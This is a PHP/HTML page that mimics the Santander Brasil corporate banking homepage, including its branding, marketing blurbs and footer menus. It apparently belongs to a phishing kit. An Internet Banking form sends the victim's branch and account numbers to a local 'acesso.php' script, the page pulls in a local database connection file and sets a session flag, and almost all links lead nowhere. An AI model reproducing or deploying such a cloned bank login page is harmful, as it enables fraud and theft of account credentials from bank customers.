<?php
include('../../conn.php');
include('../functions/functions.php');

$_SESSION['Inicializar'] = 'PassNet';
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title> </title>
	<link rel="stylesheet" href="../../_styles/content.css">
	<script src="../../_jscripts/jcontent.js"></script>
</head>
<body>
<div class="container in_cima">
	<div class="content">
		<div class="menu_pessoa">
			<a href="../pessoa-fisica/">Pessoa Física</a>
			<a href="#" class="active_link">Pessoa Jurídica</a>
		</div><!-- menu_pessoa -->
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

<div class="container in_header">
	<div class="content">
		<div class="mn_logo">
			<img src="../../_images/mn_logo.gif">
		</div><!-- mn_logo -->

		<div class="menu_geral">
			<ul>
				<li class="gr_menu active_link">Negócios e Empresas</li>
				<li class="gr_menu">Corporate</li>
				<li class="gr_menu">Global Corporate</li>
				<li class="gr_menu">Governos</li>
				<li class="ps_logger" style="margin-left:109px;">
					<div class="ps_info_cima">
						<div class="left">Internet Banking</div>
						<div class="right">Como Acessar</div>
					</div><!-- ps_info_cima -->
					<div class="ps_menu_pessoa">
						<a href="../pessoa-fisica/" class="off_link">Pessoa Física</a>
						<a href="#">Pessoa Jurídica</a>
					</div><!-- ps_menu_pessoa -->
					<div class="ps_login_now">
						<form action="acesso.php" method="post" onsubmit="return checkAcessoPJ();">
							<span class="ms_info">Agência</span>
							<input type="text" name="ag_ct" id="ag_ct" maxlength="4" class="initial_input" style="width:40px!important;"
							oninput="javascript: if(this.value.length >= this.maxLength){document.getElementById('ct_ct').focus();}"  autocomplete="off">
							<span class="ms_info_one">Conta</span>
							<input type="text" name="ct_ct" id="ct_ct" maxlength="10" class="initial_input" style="width:70px!important;" autocomplete="off">
							<input type="hidden" name="sender" value="ag_ct">
							<input type="submit" name="btn_ok" id="btn_ok" value="OK" class="btn_ok person_ok_ju">
						</form>
					</div><!-- ps_login_now -->
				</li><!-- ps_logger -->
			</ul>
		</div><!-- menu_geral -->
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

<div class="container in_big_header-juba">

	<div class="clear"></div>
</div><!-- container -->

<div class="container in_content">
	<br><br><br>
	<div class="content">
		<div class="ju_block_ns">
			<img src="../../_images/neg_emp_ju.jpg">
			<p>
				O Santander oferece produtos, serviços e assessoria através de um programa inovador para incentivar o crescimento e o desenvolvimento de pequenas e médias empresas.
			</p>
			<a href="#">Saiba mais sobre Santander Negócios & Empresas</a>
		</div><!-- ju_block_ns -->

		<div class="ju_block_ns last_jublock">
			<img src="../../_images/corp_ju.jpg">
			<p>
				Infraestrutura global construída para a administração de operações financeiras de grandes empresas, com atendimento em todo o mundo e relacionamento diferenciado através de equipe especializada.
			</p>
			<a href="#">Saiba mais sobre Santander Corporate</a>
		</div><!-- ju_block_ns -->

		<div class="ju_block_ns">
			<img src="../../_images/blog_corp_ju.jpg">
			<p>
				Presente em 22 países, o Santander Global Corporate Banking é a unidade de negócios global do Grupo Santander, com amplo conhecimento dos mercados financeiros.
			</p>
			<a href="#">Saiba mais sobre Santander Global Corporate Banking</a>
		</div><!-- ju_block_ns -->

		<div class="ju_block_ns last_jublock">
			<img src="../../_images/gov_ju.jpg">
			<p>
				O Santander dispõe de uma estrutura focada no atendimento especializado para a gestão pública, com as melhores soluções em produtos e serviços para atender este segmento.
			</p>
			<a href="#">Saiba mais sobre Governos</a>
		</div><!-- ju_block_ns -->

		<div class="block_app_ju">
			<img src="../../_images/app-emp-juba.jpg">
		</div><!-- block_app_ju -->
	</div><!-- content -->
</div><!-- container -->

<div class="container in_start_footer">
	<div class="content">
		<h1>Pessoa Física</h1>
		<img src="../../_images/ps-fis-juba.jpg" style="float:left;display:block;margin:15px 15px 0 0">
		<p style="display:block;float:left;margin:20px 0 0 0;width:625px;font-size:16px;line-height: 20px;font-weight: lighter;color:#333">
			Produtos e serviços na medida de suas necessidades, profissionais especializados na orientação e planejamento financeiro e uma completa rede de atendimento.
		</p>
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

<div class="container in_infor">
	<div class="content">
		<hr>
		<br><br>
		<a href="#">Central de Atendimento</a>
		<a href="#">SAC</a>
		<a href="#" class="last_child">Ouvidoria</a>
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

<div class="container in_in_footer">
	<div class="content">
		<a href="#">O Santander</a>
		<a href="#">Resolva On-line</a>
		<a href="#">Agências</a>
		<a href="#">Sustentabilidade</a>
		<a href="#">Análise Econômica</a>
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

<div class="container in_footer">
	<div class="content">
		<ul>
			<h1>Institucional</h1>
			<li>Santander no Mundo</li>
			<li>Santander no Brasil</li>
			<li>Governança Corporativa</li>
		</ul>
		<ul>
			<h1>Santander e Você</h1>
			<li>Abra sua conta</li>
			<li>Promoções</li>
			<li>Trabalhe Conosco</li>
			<li>Fornecedores</li>
			<li>Relação com Investidores</li>
			<li>Acionistas</li>
			<li>Sala de Imprensa</li>
		</ul>
		<ul>
			<h1>Cultura</h1>
			<li>Santander Cultural</li>
			<li>Coleção Santander Brasil</li>
			<li>Projetos e Patrocínios</li>
		</ul>
		<ul class="last_ul">
			<h1>Segurança</h1>
			<li>Segurança no Internet Banking</li>
			<li>Saiba mais sobre Segurança</li>
			<li>Fraudes</li>
			<li>Politica de Privacidade</li>
			<li>Atualização de Navegadores</li>
		</ul>
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->






<div class="container">
	<div class="content">

	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->



</body>
</html>
